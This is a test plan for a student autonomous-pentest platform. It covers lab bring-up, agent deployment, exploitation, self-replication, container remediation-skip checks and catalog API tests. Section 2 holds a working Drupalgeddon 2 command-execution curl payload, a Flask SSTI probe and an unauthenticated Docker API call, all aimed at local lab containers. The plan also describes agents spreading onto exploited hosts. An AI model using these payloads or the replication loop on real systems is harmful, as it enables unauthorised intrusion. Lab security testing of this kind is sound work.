# End-to-End Testing Plan — TFG Autonomous Cybersecurity System

**Version 2** — updated for feature `019-expand-remediation-strategies`.

**Scope:** Manual/scripted end-to-end validation of the full autonomous loop —
bootstrap → target registration → agent deployment → scan → exploitation →
auto-replication → remediation → reporting → dashboard metrics — using the local
vulnerable lab (`lab/docker-compose.yml`), **plus** validation of the expanded
remediation strategy catalog and its new dashboard browsing view.

**Assumed running:**
- API on `http://localhost:8080` (Spring Boot)
- UI on `http://localhost:4200` (Angular)
- MongoDB on `mongodb://localhost:27017`, database `tfg-system`

**Not yet running (you bring it up during Phase 2):** the vulnerable lab in `lab/`.

---

## What changed since v1

Feature `019-expand-remediation-strategies` invalidated three assumptions baked
into v1. Read these before reusing any v1 muscle memory:

1. **`strategies.json` is no longer "left unchanged."** It grew from 6 to **48
   entries** (36 distinct CVEs, 24 packages) across **4 operating systems**
   (`ubuntu-22.04`, `ubuntu-20.04`, `debian-11`, `debian-12`) and **5 action
   types** (`APT_UPGRADE`, `APT_INSTALL`, `CONFIG_UPDATE`, `SYSTEMCTL_RESTART`,
   `MANUAL`). See the new Section 9.
2. **Seeding is now incremental, not empty-only.** `RemediationStrategyLoader`
   iterates entries individually, validates each, and skips only the ones already
   stored (by `cveId + operatingSystem`) or invalid. You no longer have to drop the
   `remediation_strategies` collection to pick up new entries — a restart adds them.
3. **The lab grew from 5 to 11 containers.** Six new service targets (postgres,
   mysql, bind9, postfix, php-fpm, nodejs) back the new strategies. They are scan /
   catalog targets — they do **not** have exploitation scripts, verify scripts, or
   playbooks, and are not part of the exploit → replicate fan-out.

What did **not** change: the lab remediation outcome is still **SKIPPED** (all lab
targets are containers). See Section 0, fact #2.

---

## 0. Key architectural facts this plan is built on

Read these first — they explain what a "pass" looks like, especially for remediation.

1. **Two independent flows, two different CVE concepts.**
   - **Exploitation flow** (how the agent breaks in): application-level RCE against
     the lab targets — Drupalgeddon 2 (`CVE-2018-7600`), Tomcat PUT
     (`CVE-2017-12615`), ThinkPHP RCE (`CVE-2018-20062`), Flask SSTI (no CVE),
     unauth Docker API (no CVE). Driven by `EXPLOITATION_KNOWLEDGE` + `EXECUTE_EXPLOIT`
     plan steps, backed by NVD exploit references.
   - **Remediation flow** (what the agent fixes on a host it now controls):
     service-scan driven. The agent enumerates running OS services, looks up *their*
     CVEs via NVD, and asks the API for a strategy keyed by `(cveId, operatingSystem)`.
     This is what `api/src/main/resources/remediation/strategies.json` feeds — now
     openssh / nginx / apache2 / postgresql / mysql / mariadb / bind9 / postfix /
     dovecot / exim4 / docker / containerd / runc / php / python / nodejs / glibc /
     kernel. **The exploit CVE and the remediation CVE are not the same thing.**

2. **All lab targets are Docker containers → remediation is deliberately SKIPPED.**
   `RemediationStepHandler` runs `ContainerDetector` first; every lab image trips it
   (`/.dockerenv` + `/docker/` cgroup). The agent then reports a
   `CONTAINER-DETECTED / SKIPPED` remediation record and **never consults
   `strategies.json`**. This is the intended behavior (feature `012-docker-remediation-skip`).
   **For the lab, the correct remediation outcome is `SKIPPED`, not `SUCCESS`.** This
   is true for the six new containers too — they are containers, so they also skip.

3. **The expanded `strategies.json` is still unreachable from the lab.** Because of
   (2) it is unreachable end-to-end from every lab target, and its entries model OS
   package updates keyed to distro strings (`ubuntu-22.04`, `debian-12`, …), not the
   agent's runtime `operatingSystem` string. The correct way to prove the new
   strategies loaded is to query the catalog API/UI directly (Section 9), **not** to
   expect them to fire during a lab remediation. See Appendix A for the two
   mismatches (container-skip + OS-string) that would have to be resolved first.

4. **`operatingSystem` sent by the agent is `linux-<kernel>`**, e.g.
   `linux-5.15.0-91-generic` (`RemediationStepHandler.detectOperatingSystem()` uses
   `System.getProperty("os.version")`) — not `ubuntu-22.04`. Relevant only if you
   ever pursue the non-container remediation path (Appendix A).

---

## 1. Prerequisites & environment

| Requirement | Check | Notes |
|---|---|---|
| Docker Desktop running | `docker info` | Needed for the lab. |
| API up | `curl -s localhost:8080/auth/check-setup` | Returns setup state JSON. |
| UI up | open `http://localhost:4200` | Login screen renders. |
| MongoDB reachable | `mongosh mongodb://localhost:27017/tfg-system --eval 'db.stats().db'` | Or MongoDB Compass. |
| `NVD_API_KEY` set for the API | check API env | **Strongly recommended.** NVD lookups drive both exploitation knowledge and remediation CVE discovery; without a key you are throttled to 5 req/30s and lookups may be slow/empty. |
| Agent build toolchain | `cd agents/unix && ./mvnw -q -version` | Java 17. |

> If `NVD_API_KEY` is unset, restart the API with it exported before testing the
> exploitation/vuln-lookup phases: `export NVD_API_KEY=<key>`.

### Environment variables the API reads (from `application.properties`)
`MONGODB_URI`, `MONGODB_DATABASE_NAME`, `JWT_SECRET`, `ALLOWED_ORIGINS`,
`APPLICATION_DOMAIN`, `RESEND_API_KEY` (email — optional for E2E),
`NVD_API_KEY`, `REPLICATION_PRIVATE_KEY` (has a baked default).

### Confirm the strategy catalog seeded on startup
On API boot, `RemediationStrategyLoader` logs a single summary line. A healthy
first run against an empty collection looks like:

```
Seed complete: 48 added, 0 skipped (already exist), 0 invalid, 0 duplicated in file
```

On a restart against an already-seeded DB you should see `0 added, 48 skipped`.
Any non-zero `invalid` or `duplicated in file` count points at a bad entry in
`strategies.json` (the loader logs the offending index and reason just above the
summary) — investigate before trusting catalog assertions.

---

## 2. Bring up and verify the vulnerable lab

```bash
cd lab
docker compose up -d --build
docker compose ps            # all 11 services healthy
./scripts/verify-all.sh      # confirms the 5 EXPLOITABLE targets are actually exploitable
```

### 2.1 Exploitable targets (drive the exploit → replicate loop)

Static IPs on the `targets` bridge, host-mapped ports. These have verify scripts and
playbooks and participate in the autonomous exploitation flow:

| Service   | Host URL                | Container IP  | Exploit CVE      |
|-----------|-------------------------|---------------|------------------|
| Drupal    | http://localhost:8081   | 172.20.0.10   | CVE-2018-7600    |
| Tomcat    | http://localhost:8082   | 172.20.0.11   | CVE-2017-12615   |
| Flask     | http://localhost:8000   | 172.20.0.12   | SSTI (no CVE)    |
| ThinkPHP  | http://localhost:8083   | 172.20.0.13   | CVE-2018-20062   |
| Docker API| http://localhost:2375   | 172.20.0.14   | unauth API       |

### 2.2 Service targets (catalog-backing, added in feature 019)

These back the expanded strategy catalog. They are **scan targets only** — no
exploitation scripts, no verify scripts, no playbooks, not part of replication.
Their value is proving the services start and are reachable (SC-011), and giving the
service-scan a broader surface. Because they are containers, any remediation against
them still **SKIPS** (fact #2).

| Service   | Host port        | Container IP  | Base image        | Related strategy package |
|-----------|------------------|---------------|-------------------|--------------------------|
| PostgreSQL| 5432/tcp         | 172.20.0.20   | postgres:14.4     | postgresql-14            |
| MySQL     | 3306/tcp         | 172.20.0.21   | mysql:8.0.28      | mysql-server-8.0         |
| BIND9     | 5353/udp → 53    | 172.20.0.22   | ubuntu:22.04      | bind9                    |
| Postfix   | 2525/tcp → 25    | 172.20.0.23   | ubuntu:22.04      | postfix                  |
| PHP-FPM   | 9000/tcp         | 172.20.0.24   | php:8.1.16-fpm    | php8.1-fpm               |
| Node.js   | 3000/tcp         | 172.20.0.25   | node:18.16.0      | nodejs                   |

**Manual sanity spot-checks** for the exploitable targets (from `lab/playbooks/*.md`):

```bash
# Flask SSTI → expect "Hello 49"
curl -s 'http://localhost:8000/?name={{7*7}}'
# Drupal → expect uid=…(www-data)
curl -k -s 'http://localhost:8081/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=id'
# Docker API → expect JSON with ApiVersion
curl -s 'http://localhost:2375/version'
```

**Reachability spot-checks** for the new service targets (no exploit expected —
just prove the service answers):

```bash
docker compose ps postgres mysql bind9 postfix php-fpm nodejs   # all Up
nc -zv localhost 5432 && nc -zv localhost 3306 && nc -zv localhost 3000
nc -zvu localhost 5353            # BIND9 (UDP)
curl -s telnet://localhost:2525 </dev/null | head -1   # Postfix banner (220 …)
```

**Pass:** the 5 exploitable targets respond with their expected exploit signature
(`verify-all.sh` green), and the 6 new service targets are `Up` and reachable on
their documented ports within 60s of `docker compose up`.

---

## 3. Bootstrap the platform (auth, org, project)

Do this via the UI or via API. API path shown for scriptability.

### 3.1 Initial admin setup (only once per DB)
```bash
curl -s localhost:8080/auth/check-setup            # -> {"setupComplete": false} first time
# Create the initial admin (shape per AuthenticationController /auth/setup)
curl -s -X POST localhost:8080/auth/setup -H 'Content-Type: application/json' \
  -d '{"email":"santipulido4@gmail.com","password":"<pw>","name":"Admin"}'
```

### 3.2 Login and capture JWT
```bash
TOKEN=$(curl -s -X POST localhost:8080/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"santipulido4@gmail.com","password":"<pw>"}' | jq -r '.token // .accessToken')
echo "$TOKEN"
```

### 3.3 Create organization and project
```bash
ORG=$(curl -s -X POST localhost:8080/api/organizations -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"name":"E2E Org"}' | jq -r '.id')

PROJ=$(curl -s -X POST localhost:8080/api/projects -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{\"name\":\"E2E Lab\",\"organizationId\":\"$ORG\"}" | jq -r '.id')
```

**Pass:** org and project IDs returned; visible under project selector in the UI.

> The project header context (`X-Organization-Id` / `X-Project-Id` or the selected
> project in the UI) scopes all subsequent target/agent/remediation queries. Keep
> `$ORG`/`$PROJ` consistent throughout. Note the strategy catalog (Section 9) is a
> **global** resource and is *not* scoped by org/project.

---

## 4. Register the seed target

Register **one** lab machine as the initial foothold target (the rest get
auto-registered via replication in Phase 6). Docker API or Drupal make good seeds.

`CreateTargetRequest`: `systemName`, `description`, `os` (`LINUX`),
`organizationId`, `projectId`, optional `preauthCode`.

```bash
TARGET=$(curl -s -X POST localhost:8080/api/targets -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{
    \"systemName\":\"lab-drupal\",
    \"description\":\"Drupal 8.5.0 CVE-2018-7600\",
    \"os\":\"LINUX\",
    \"organizationId\":\"$ORG\",
    \"projectId\":\"$PROJ\"
  }" | jq -r '.id')
```

Set the target's reachable address to the container (e.g. `172.20.0.10` /
`http://localhost:8081`) via the UI target edit or `PUT /api/targets/{id}` so the
exploitation flow has an `ipOrDomain`.

**Pass:** target listed in `GET /api/targets` and in the UI targets table.

---

## 5. Deploy an agent onto the seed host

The agent is a standalone Spring Boot / GraalVM app that polls the API every ~10s.

### 5.1 Build the agent (JVM mode is fine for E2E)
```bash
cd agents/unix && ./mvnw -q clean package
```

### 5.2 Run it against the API
```bash
java -jar target/agent-0.0.1-SNAPSHOT.jar --api.url=http://localhost:8080
```
(Or use the install-script/download flow: `GET /api/agent/download/{platform}` /
`GET /api/agent/binary/download/{installToken}` — exercises features `013`/`015`.)

### 5.3 Verify registration & heartbeat
```bash
curl -s localhost:8080/api/agent -H "Authorization: Bearer $TOKEN" | jq '.[].id'
curl -s localhost:8080/api/agent/metrics -H "Authorization: Bearer $TOKEN" | jq
```

**Pass:** the agent appears with a recent heartbeat (feature `011-agent-heartbeat-monitor`);
UI Agents view shows it `ONLINE`.

---

## 6. Assign a plan and run the autonomous loop

The agent executes an ordered plan. For a full E2E, assign a template whose steps are:

`SYSTEM_SCAN → SERVICE_SCAN → EXPLOITATION_KNOWLEDGE → EXECUTE_EXPLOIT →
REQUEST_REPLICATION → REPLICATE → SERVICE_SCAN → REMEDIATE → GENERATE_REPORT → SEND_REPORT`

### 6.1 Create/choose a template
Create via UI (Templates) or `POST /api/templates`, then assign:
```bash
curl -s -X POST "localhost:8080/api/agent/$AGENT_ID/plan/from-template/$TEMPLATE_ID" \
  -H "Authorization: Bearer $TOKEN" | jq
```
(Feature `014-assign-plan-modal`.)

### 6.2 Watch the plan advance
```bash
watch -n 3 "curl -s localhost:8080/api/agent/$AGENT_ID/plan -H 'Authorization: Bearer $TOKEN' | jq '.steps[] | {action,status}'"
```

**Pass:** steps progress `PENDING → IN_PROGRESS → COMPLETED` in order; step logs
are populated (visible via `GET /api/agent/{id}/plan` and the UI plan view).

---

## 7. Verify exploitation & auto-replication

For the seed target:

1. `EXPLOITATION_KNOWLEDGE` returns exploit scripts for the discovered service
   (`POST /api/agent/comm/exploitation-knowledge`, backed by NVD exploit refs).
2. `EXECUTE_EXPLOIT` achieves RCE (validated with the lab's 3-layer check:
   marker-file absence / container-net fingerprint / unique `/tmp/pwned_*` artifact —
   see `lab/playbooks/validation.md`).
3. `REQUEST_REPLICATION` + `REPLICATE`/`TRANSFER_AGENT` push a new agent onto the
   exploited container.
4. The exploited host is **auto-registered as a new target by hostname**
   (feature `016-exploited-target-registration`).

**Checks:**
```bash
# New target auto-registered from the exploited host
curl -s localhost:8080/api/targets -H "Authorization: Bearer $TOKEN" | jq '.[].systemName'
# New (child) agent registered and heart-beating
curl -s localhost:8080/api/agent -H "Authorization: Bearer $TOKEN" | jq 'length'
# Artifact proof on the target container
docker exec lab-drupal-1 sh -c 'ls -la /tmp/pwned_* 2>/dev/null'
```

**Pass:** child agent + auto-registered target appear; RCE artifact present on the
container.

> Repeat Phases 4–7 (or let replication fan out) to cover the five **exploitable**
> targets. The six service targets from §2.2 have no exploit path and are not
> expected to appear as exploited/auto-registered hosts. Note the Docker API target
> grants host-context RCE via a privileged container — validation uses
> `chroot /mnt` per `lab/playbooks/docker-api.md`.

---

## 8. Verify remediation — **container-skip is the expected outcome**

This is the decisive remediation assertion for the lab. When the child agent (now
running *inside* a lab container) reaches `REMEDIATE`, `ContainerDetector` fires and
remediation is skipped — `strategies.json` is never consulted.

```bash
# Remediation records for this project (RemediationController)
curl -s "localhost:8080/api/remediations" -H "Authorization: Bearer $TOKEN" | jq '.content[] | {cveId,status,remediationType,skipReason}'
```

**Pass criteria (per the chosen scope):**
- A remediation record exists with:
  - `status = SKIPPED`
  - `cveId = CONTAINER-DETECTED`
  - `remediationType = CONTAINER_DETECTED`
  - `skipReason` containing `"Docker container detected"` (or the generic container
    message / inconclusive-precaution variant).
- The record's `preCheckLogs` contain the detection evidence
  (`DETECTION: runtime=docker`, `confidence=CONFIRMED`, method).
- A `REMEDIATION_COMPLETED` alert fired with severity `WARNING`
  (SKIPPED → WARNING in `RemediationServiceImpl.determineSeverity`).

**Explicit non-goal:** do **not** expect `SUCCESS`/`PENDING_REBOOT` or any
`apt-get` execution for lab targets. Seeing those would mean container detection
regressed.

### 8.1 (Optional) Confirm the agent strategy-resolution endpoint still works
Independently of the skip path, verify the knowledge base resolves a seeded entry
when queried directly (proves the data loaded and the agent endpoint is wired):
```bash
# Uses a seeded (cveId, os) pair from strategies.json — note os must match exactly.
curl -s -X POST localhost:8080/api/agent/comm/remediation/strategy \
  -H "Authorization: Bearer $AGENT_JWT" -H 'Content-Type: application/json' \
  -d '{"cveId":"CVE-2023-38408","operatingSystem":"ubuntu-22.04","packageName":"openssh-server","currentVersion":"1:8.9p1"}' | jq
```
**Pass:** `found=true` with `fixCommands`. This confirms seeding worked; it does **not**
represent the lab remediation path (which skips). Requires an agent-scoped JWT.

---

## 9. Verify the expanded strategy catalog (feature 019)

This is the new surface for feature `019`. It has two parts: the **catalog API**
(admin-facing, JWT-authenticated) and the **dashboard browsing view**. Neither
depends on the lab or on any agent — you can test them immediately after Phase 3.

### 9.1 Catalog API

```bash
# Count + aggregate breakdown
curl -s localhost:8080/api/remediation-strategies/count -H "Authorization: Bearer $TOKEN" | jq
# -> { "total": 48, "byType": {...}, "byOs": { "ubuntu-22.04": 36, "ubuntu-20.04": 3, "debian-11": 4, "debian-12": 5 } }

# First page (default size 20, sorted by cveId asc)
curl -s "localhost:8080/api/remediation-strategies?page=0&size=20" -H "Authorization: Bearer $TOKEN" \
  | jq '{total: .totalElements, first: .content[0].cveId, count: (.content | length)}'

# Single entry by id
ID=$(curl -s "localhost:8080/api/remediation-strategies?size=1" -H "Authorization: Bearer $TOKEN" | jq -r '.content[0].id')
curl -s "localhost:8080/api/remediation-strategies/$ID" -H "Authorization: Bearer $TOKEN" | jq '{cveId,operatingSystem,packageName,action,fixCommands}'
```

**Combined filters (the fixed behavior — filters AND together):**
```bash
# OS AND package together — must return only nginx-on-ubuntu-22.04 rows, not all of ubuntu-22.04
curl -s "localhost:8080/api/remediation-strategies?operatingSystem=ubuntu-22.04&packageName=nginx" \
  -H "Authorization: Bearer $TOKEN" | jq '.content[] | {cveId,operatingSystem,packageName}'

# Partial CVE match (case-insensitive substring)
curl -s "localhost:8080/api/remediation-strategies?cveId=2024" -H "Authorization: Bearer $TOKEN" | jq '.totalElements'

# Filter by action type
curl -s "localhost:8080/api/remediation-strategies?action=CONFIG_UPDATE" -H "Authorization: Bearer $TOKEN" | jq '.content[] | .cveId'
```

**Pass:**
- `count.total = 48`; `byOs` shows all 4 operating systems.
- Every row returned by the `operatingSystem=…&packageName=…` query matches **both**
  filters (this is the bug fixed in this branch — the old code honored only the first
  filter). No row with a different package or OS may appear.
- Partial `cveId=2024` returns only CVEs containing "2024".
- An unknown enum value (e.g. `action=NONSENSE`) returns an empty page, not a 500.
- No `cveId + operatingSystem` pair appears twice across the whole catalog.

### 9.2 Dashboard browsing view

Route: `http://localhost:4200/remediations/strategies`.

Steps:
1. Open the route, confirm the table renders 48 rows across pages (page size 10).
2. Type a partial CVE in the CVE filter → the table narrows.
3. Pick an OS from the OS dropdown → only that OS's rows remain.
4. Combine OS + package filters → intersection only (matches §9.1).
5. Expand a row → the pre-check / fix / post-check command lists and notes render
   in monospace.

**Pass:** filtering and the expansion panel work; the counts reconcile with §9.1.

> **Known gaps in this build (do not log as regressions):**
> - The strategies view is **not linked from the nav menu** — reach it by typing the
>   URL directly.
> - Column sorting is **decorative**: clicking a header triggers a round-trip but the
>   server always sorts by `cveId` asc, so the order does not change.
> - The view's labels have **no Spanish translation yet** — under the `es` build they
>   render in English.

---

## 10. Verify reporting & dashboard metrics

Feature `017-reports-module` + `018-real-metrics-stats` (metrics are now real, not mock).

```bash
# Generate / list immutable reports
curl -s -X POST localhost:8080/api/reports -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{\"projectId\":\"$PROJ\"}" | jq '.id'
curl -s localhost:8080/api/reports -H "Authorization: Bearer $TOKEN" | jq '.[].id'

# Dashboard KPIs / critical vulns / trend
curl -s localhost:8080/api/dashboard/kpis -H "Authorization: Bearer $TOKEN" | jq
curl -s localhost:8080/api/dashboard/critical-vulnerabilities -H "Authorization: Bearer $TOKEN" | jq
curl -s localhost:8080/api/dashboard/vulnerability-trend -H "Authorization: Bearer $TOKEN" | jq

# Remediation statistics (should reflect the SKIPPED count)
curl -s localhost:8080/api/remediations/statistics -H "Authorization: Bearer $TOKEN" | jq
curl -s localhost:8080/api/vulnerabilities/statistics -H "Authorization: Bearer $TOKEN" | jq
```

**Pass:**
- Dashboard KPIs reflect the real agents/targets/vulnerabilities created above
  (no mock/placeholder values).
- `remediations/statistics.byStatus.SKIPPED >= 1`; `meanTimeToRemediateSeconds`
  computed.
- Reports list contains the generated report; opening it in the UI renders findings.
- UI Dashboard, Agents, Vulnerabilities, and the remediation widget all render the
  same numbers as the API.

> **Known pre-existing test failure (unrelated to feature 019):**
> `DashboardServiceImplTest.getKpis_returnsCorrectCounts` fails when the full API
> test suite runs (a Mockito `PotentialStubbingProblem`; it passes in isolation).
> This predates this branch. A full-suite `./mvnw clean package` will report one
> failing test for this reason; it is not caused by the catalog changes.

---

## 11. Teardown / reset between runs

```bash
cd lab && ./scripts/reset-all.sh          # or: docker compose down -v && docker compose up -d --build
# Stop agents (Ctrl-C on the java processes, or platform self-destruct SELF_DESTRUCT step)
```

To re-run cleanly against a fresh platform state, drop the relevant Mongo
collections (agents, targets, remediation_records, plans, reports).

> **Re-seeding note (changed in 019):** seeding is now **incremental**. You no
> longer need to drop `remediation_strategies` to pick up edits to `strategies.json`
> — restarting the API adds any new `(cveId, operatingSystem)` entries and skips the
> ones already present. Drop the collection only if you want to remove entries that
> were deleted from the file, or to re-observe a clean `48 added` seed log.

---

## 12. E2E pass/fail checklist

| # | Check | Expected |
|---|---|---|
| 1 | Lab up, 11 containers healthy | `docker compose ps` all Up |
| 2 | 5 exploitable targets exploitable | `verify-all.sh` green |
| 3 | 6 service targets reachable | ports answer within 60s |
| 4 | Strategy seed log clean | `48 added … 0 invalid, 0 duplicated` |
| 5 | Admin setup + login | JWT issued |
| 6 | Org + project created | IDs returned, visible in UI |
| 7 | Seed target registered | in `GET /api/targets` |
| 8 | Agent registers + heartbeats | `ONLINE` in UI |
| 9 | Plan steps advance in order | all `COMPLETED`, logs present |
| 10 | Exploit achieves RCE | `/tmp/pwned_*` on container |
| 11 | Auto-replication | child agent + auto-registered target |
| 12 | **Remediation SKIPPED (container)** | `CONTAINER-DETECTED / SKIPPED` record + WARNING alert |
| 13 | Agent strategy endpoint resolves seeded CVE | `found=true` (optional, §8.1) |
| 14 | **Catalog count** | `/count.total = 48`, 4 operating systems |
| 15 | **Combined catalog filters AND together** | OS+package query returns intersection only |
| 16 | **No duplicate CVE+OS in catalog** | every pair unique |
| 17 | Dashboard strategy view browsable | 48 rows, filters + expansion work |
| 18 | Report generated & immutable | listed, renders in UI |
| 19 | Dashboard shows real metrics | matches API, no mocks |
| 20 | Reset restores clean lab | targets exploitable again |

---

## Appendix A — Why the expanded `strategies.json` still cannot fire in the lab

Feature `019` expanded `strategies.json` to 48 entries across 4 operating systems.
Even so, in the lab the catalog remains unreachable **end-to-end** for two
independent reasons — so the correct way to prove it loaded is the catalog API/UI
(Section 9), not a lab remediation:

1. **Container-skip (primary).** Every lab target — including the six new service
   containers — is a Docker container, so `RemediationStepHandler` short-circuits to
   a `CONTAINER-DETECTED / SKIPPED` record before any strategy lookup. This is
   intended behavior (feature `012`).

2. **OS-string mismatch (secondary).** Even on a non-container host, the agent
   sends `operatingSystem = "linux-" + System.getProperty("os.version")`
   (e.g. `linux-5.15.0-91-generic`), while every seeded strategy uses a distro
   string (`ubuntu-22.04`, `ubuntu-20.04`, `debian-11`, `debian-12`).
   `findByCveIdAndOperatingSystem` would return empty → `FAILED (no strategy)`.

Additionally, the lab's *exploit* CVEs (Drupalgeddon, Tomcat PUT, ThinkPHP) are
application-level RCEs, not `apt`-remediable service updates, so they are
intentionally absent from `strategies.json`.

**To exercise `strategies.json` for real (out of current scope)** you would need to:
- Add a genuine (non-container) Linux VM/host target running one of the modeled
  vulnerable services (e.g. an outdated `openssh-server`), and deploy the agent on it;
- Align the strategy `operatingSystem` values with what the agent actually reports
  (`linux-<kernel>`), or normalize `detectOperatingSystem()` to emit a distro string
  like `ubuntu-22.04`;
- No collection drop is required to pick up new file entries — seeding is now
  incremental (Section 11). Drop `remediation_strategies` only to remove entries that
  were deleted from the file or to re-observe a clean seed log.
